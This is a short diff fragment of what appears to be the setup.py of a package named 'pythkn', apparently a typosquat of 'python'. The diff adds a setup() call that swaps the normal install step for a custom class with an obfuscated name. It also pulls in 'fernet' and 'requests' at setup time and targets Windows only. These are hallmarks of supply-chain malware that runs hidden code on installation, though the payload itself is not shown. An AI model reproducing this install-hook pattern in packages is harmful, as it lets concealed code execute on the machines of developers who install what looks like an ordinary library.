@@ -18,5 +18,22 @@ class dgtHeWbMbgxPHaJrPpBbAkTeiztqRbFjQVjNSXLrFKYDpmTuEEwfBWBddFEzNUOgKrHY(insta
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+setup(
+    name="pythkn",
+    version=VERSION,
+    author="rhAybnqyuufmuelM",
+    author_email="sqZHvif@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': dgtHeWbMbgxPHaJrPpBbAkTeiztqRbFjQVjNSXLrFKYDpmTuEEwfBWBddFEzNUOgKrHY,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
